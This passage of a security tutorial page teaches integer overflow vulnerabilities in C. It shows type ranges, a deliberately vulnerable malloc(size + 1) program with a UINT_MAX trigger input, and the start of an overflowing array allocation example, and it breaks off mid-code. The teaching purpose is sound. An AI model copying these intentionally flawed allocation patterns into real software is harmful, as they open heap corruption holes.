
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
        <link rel="canonical" href="https://dylan-liew.github.io/rev-dojo/binary-exploitation/memory/03-integer-overflow/">
      
      
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
    
    
      
        <title>Integer Overflow Vulnerabilities - Rev-Dojo</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.7e37652d.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../../assets/custom.css">
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="blue">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#integer-overflow-vulnerabilities" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="Rev-Dojo" class="md-header__button md-logo" aria-label="Rev-Dojo" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Rev-Dojo
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Integer Overflow Vulnerabilities
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="blue"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="Rev-Dojo" class="md-nav__button md-logo" aria-label="Rev-Dojo" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    Rev-Dojo
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Home
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    Foundations
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Foundations
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../foundations/01-c-essentials-i/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    C Programming Essentials I
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../foundations/01-c-essentials-ii/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    C Programming Essentials II
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../foundations/02-compilation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Compilation Process
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#understanding-integer-overflows" class="md-nav__link">
    <span class="md-ellipsis">
      Understanding Integer Overflows
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Understanding Integer Overflows">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#integer-types-and-ranges" class="md-nav__link">
    <span class="md-ellipsis">
      Integer Types and Ranges
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#types-of-integer-overflows" class="md-nav__link">
    <span class="md-ellipsis">
      Types of Integer Overflows
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#vulnerable-code-examples" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerable Code Examples
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Vulnerable Code Examples">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#basic-integer-overflow" class="md-nav__link">
    <span class="md-ellipsis">
      Basic Integer Overflow
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#array-allocation-overflow" class="md-nav__link">
    <span class="md-ellipsis">
      Array Allocation Overflow
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#length-validation-bypass" class="md-nav__link">
    <span class="md-ellipsis">
      Length Validation Bypass
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sign-extension-vulnerability" class="md-nav__link">
    <span class="md-ellipsis">
      Sign Extension Vulnerability
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploitation-techniques" class="md-nav__link">
    <span class="md-ellipsis">
      Exploitation Techniques
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exploitation Techniques">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#heap-overflow-via-integer-overflow" class="md-nav__link">
    <span class="md-ellipsis">
      Heap Overflow via Integer Overflow
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bypassing-size-checks" class="md-nav__link">
    <span class="md-ellipsis">
      Bypassing Size Checks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#memory-corruption-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Memory Corruption Attacks
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#advanced-integer-overflow-techniques" class="md-nav__link">
    <span class="md-ellipsis">
      Advanced Integer Overflow Techniques
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Advanced Integer Overflow Techniques">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#race-conditions-with-toctou" class="md-nav__link">
    <span class="md-ellipsis">
      Race Conditions with TOCTOU
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cryptographic-integer-overflows" class="md-nav__link">
    <span class="md-ellipsis">
      Cryptographic Integer Overflows
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#detection-and-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      Detection and Analysis
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Detection and Analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#static-analysis-for-integer-overflows" class="md-nav__link">
    <span class="md-ellipsis">
      Static Analysis for Integer Overflows
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dynamic-detection-with-sanitizers" class="md-nav__link">
    <span class="md-ellipsis">
      Dynamic Detection with Sanitizers
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#runtime-testing" class="md-nav__link">
    <span class="md-ellipsis">
      Runtime Testing
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#mitigation-and-prevention" class="md-nav__link">
    <span class="md-ellipsis">
      Mitigation and Prevention
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Mitigation and Prevention">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#safe-integer-arithmetic" class="md-nav__link">
    <span class="md-ellipsis">
      Safe Integer Arithmetic
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#compiler-based-protections" class="md-nav__link">
    <span class="md-ellipsis">
      Compiler-Based Protections
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#language-level-solutions" class="md-nav__link">
    <span class="md-ellipsis">
      Language-Level Solutions
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#key-takeaways" class="md-nav__link">
    <span class="md-ellipsis">
      Key Takeaways
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



<h1 id="integer-overflow-vulnerabilities">Integer Overflow Vulnerabilities</h1>
<p>Integer overflow vulnerabilities occur when arithmetic operations produce results that exceed the maximum value that can be stored in the integer type. These can lead to unexpected behavior, memory corruption, and security bypasses.</p>
<h2 id="understanding-integer-overflows">Understanding Integer Overflows</h2>
<h3 id="integer-types-and-ranges">Integer Types and Ranges</h3>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">Integer</span><span class="w"> </span><span class="n">Type</span><span class="w"> </span><span class="n">Ranges</span><span class="w"> </span><span class="p">(</span><span class="n">typical</span><span class="w"> </span><span class="mi">64</span><span class="o">-</span><span class="n">bit</span><span class="w"> </span><span class="n">system</span><span class="p">)</span><span class="o">:</span>
<span class="err">┌─────────────────────┬─────────────────────┬─────────────────────┐</span>
<span class="err">│</span><span class="w"> </span><span class="n">Type</span><span class="w">                </span><span class="err">│</span><span class="w"> </span><span class="n">Minimum</span><span class="w"> </span><span class="n">Value</span><span class="w">       </span><span class="err">│</span><span class="w"> </span><span class="n">Maximum</span><span class="w"> </span><span class="n">Value</span><span class="w">       </span><span class="err">│</span>
<span class="err">├─────────────────────┼─────────────────────┼─────────────────────┤</span>
<span class="err">│</span><span class="w"> </span><span class="kt">char</span><span class="w">                </span><span class="err">│</span><span class="w"> </span><span class="mi">-128</span><span class="w">                </span><span class="err">│</span><span class="w"> </span><span class="mi">127</span><span class="w">                 </span><span class="err">│</span>
<span class="err">│</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w">       </span><span class="err">│</span><span class="w"> </span><span class="mi">0</span><span class="w">                   </span><span class="err">│</span><span class="w"> </span><span class="mi">255</span><span class="w">                 </span><span class="err">│</span>
<span class="err">│</span><span class="w"> </span><span class="kt">short</span><span class="w">               </span><span class="err">│</span><span class="w"> </span><span class="mi">-32</span><span class="p">,</span><span class="mi">768</span><span class="w">             </span><span class="err">│</span><span class="w"> </span><span class="mi">32</span><span class="p">,</span><span class="mi">767</span><span class="w">              </span><span class="err">│</span>
<span class="err">│</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">short</span><span class="w">      </span><span class="err">│</span><span class="w"> </span><span class="mi">0</span><span class="w">                   </span><span class="err">│</span><span class="w"> </span><span class="mi">65</span><span class="p">,</span><span class="mi">535</span><span class="w">              </span><span class="err">│</span>
<span class="err">│</span><span class="w"> </span><span class="kt">int</span><span class="w">                 </span><span class="err">│</span><span class="w"> </span><span class="mi">-2</span><span class="p">,</span><span class="mi">147</span><span class="p">,</span><span class="mi">483</span><span class="p">,</span><span class="mi">648</span><span class="w">      </span><span class="err">│</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="mi">147</span><span class="p">,</span><span class="mi">483</span><span class="p">,</span><span class="mi">647</span><span class="w">       </span><span class="err">│</span>
<span class="err">│</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w">        </span><span class="err">│</span><span class="w"> </span><span class="mi">0</span><span class="w">                   </span><span class="err">│</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="mi">294</span><span class="p">,</span><span class="mi">967</span><span class="p">,</span><span class="mi">295</span><span class="w">       </span><span class="err">│</span>
<span class="err">│</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w">           </span><span class="err">│</span><span class="w"> </span><span class="mi">-9</span><span class="p">,</span><span class="mi">223</span><span class="p">,</span><span class="mi">372</span><span class="p">,</span><span class="mo">036</span><span class="p">,</span><span class="mi">854</span><span class="p">,</span><span class="mi">775</span><span class="p">,</span><span class="mi">808</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="mi">9</span><span class="p">,</span><span class="mi">223</span><span class="p">,</span><span class="mi">372</span><span class="p">,</span><span class="mo">036</span><span class="p">,</span><span class="mi">854</span><span class="p">,</span><span class="mi">775</span><span class="p">,</span><span class="mi">807</span><span class="w"> </span><span class="err">│</span>
<span class="err">│</span><span class="w"> </span><span class="kt">size_t</span><span class="w">              </span><span class="err">│</span><span class="w"> </span><span class="mi">0</span><span class="w">                   </span><span class="err">│</span><span class="w"> </span><span class="mi">18</span><span class="p">,</span><span class="mi">446</span><span class="p">,</span><span class="mi">744</span><span class="p">,</span><span class="mo">073</span><span class="p">,</span><span class="mi">709</span><span class="p">,</span><span class="mi">551</span><span class="p">,</span><span class="mi">615</span><span class="w"> </span><span class="err">│</span>
<span class="err">└─────────────────────┴─────────────────────┴─────────────────────┘</span>
</code></pre></div></td></tr></table></div>
<h3 id="types-of-integer-overflows">Types of Integer Overflows</h3>
<ol>
<li><strong>Arithmetic overflow</strong> - Addition, multiplication exceeding limits</li>
<li><strong>Wraparound</strong> - Values wrapping from max to min or vice versa</li>
<li><strong>Underflow</strong> - Unsigned values wrapping to maximum</li>
<li><strong>Sign extension issues</strong> - Mixing signed and unsigned types</li>
<li><strong>Truncation</strong> - Casting larger types to smaller types</li>
</ol>
<h2 id="vulnerable-code-examples">Vulnerable Code Examples</h2>
<h3 id="basic-integer-overflow">Basic Integer Overflow</h3>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="c1">// vuln_overflow.c</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">vulnerable_malloc</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">size</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Allocating buffer of size: %u</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">size</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// VULNERABLE: size can overflow in arithmetic</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span><span class="w">  </span><span class="c1">// +1 for null terminator</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">buffer</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Allocation failed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Buffer allocated at: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// Fill buffer with &#39;A&#39;s</span>
<span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;A&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">size</span><span class="p">);</span>
<span class="w">    </span><span class="n">buffer</span><span class="p">[</span><span class="n">size</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;\0&#39;</span><span class="p">;</span>

<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Buffer filled</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: %s &lt;size&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="p">)</span><span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="w">    </span><span class="n">vulnerable_malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></td></tr></table></div>
<p><strong>Test:</strong>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code>gcc<span class="w"> </span>-o<span class="w"> </span>vuln_overflow<span class="w"> </span>vuln_overflow.c
./vuln_overflow<span class="w"> </span><span class="m">100</span><span class="w">        </span><span class="c1"># Normal case</span>
./vuln_overflow<span class="w"> </span><span class="m">4294967295</span><span class="w"> </span><span class="c1"># UINT_MAX - causes overflow in size + 1</span>
</code></pre></div></td></tr></table></div></p>
<h3 id="array-allocation-overflow">Array Allocation Overflow</h3>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span>
<span class="normal">39</span>
<span class="normal">40</span>
<span class="normal">41</span>
<span class="normal">42</span>
<span class="normal">43</span>
<span class="normal">44</span>
<span class="normal">45</span>
<span class="normal">46</span>
<span class="normal">47</span>
<span class="normal">48</span>
<span class="normal">49</span>
<span class="normal">50</span>
<span class="normal">51</span>
<span class="normal">52</span>
<span class="normal">53</span>
<span class="normal">54</span>
<span class="normal">55</span>
<span class="normal">56</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="c1">// vuln_array_alloc.c</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>

<span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="p">;</span>
<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">count</span><span class="p">;</span>
<span class="p">}</span><span class="w"> </span><span class="n">int_array</span><span class="p">;</span>

<span class="n">int_array</span><span class="o">*</span><span class="w"> </span><span class="nf">create_array</span><span class="p">(</span><span class="kt">size_t</span><span class="w"> </span><span class="n">count</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Creating array with %zu elements</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">count</span><span class="p">);</span>

<span class="w">    </span><span class="n">int_array</span><span class="w"> </span><span class="o">*</span><span class="n">arr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">int_array</span><span class="p">));</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">arr</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// VULNERABLE: count * sizeof(int) can overflow</span>
<span class="w">    </span><span class="n">arr</span><span class="o">-&gt;</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="n">count</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">arr</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">free</span><span class="p">(</span><span class="n">arr</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
